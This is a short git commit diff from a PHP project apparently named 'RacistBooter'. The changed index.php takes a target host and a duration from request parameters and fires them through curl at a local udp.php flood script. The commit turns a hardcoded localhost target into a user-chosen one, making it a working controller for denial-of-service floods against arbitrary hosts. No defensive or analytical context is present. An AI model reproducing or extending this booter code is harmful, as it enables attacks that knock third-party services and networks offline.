aa2c68f2bc02cfeccc84f75a8c0f6cc481413f4f
Noyameki <dunthenerd@gmail.com>
2011-08-04 00:42:15 +0200

    Changed output and host input

--- index.php
+++ index.php
@@ -6,11 +6,11 @@ $host = $_GET['host'];
 $time = intval($_GET['time']);
 $mc = EpiCurl::getInstance();
 
-$shell = trim("http://127.0.0.1/RacistBooter/udp.php?act=phptools&host=127.0.0.1&time={$time}");
-echo $shell;
+$shell = trim("http://127.0.0.1/RacistBooter/udp.php?act=phptools&host={$host}&time={$time}");
+
 $ch = curl_init($shell);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
 curl_setopt($ch, CURLOPT_TIMEOUT, 15);
 $curl1 = $mc->addCurl($ch);	     
-echo "Response code from Yahoo! is {$curl1->code}\n";  
+echo "Response code from 127.0.0.1 is {$curl1->code}\n"; 
 ?>
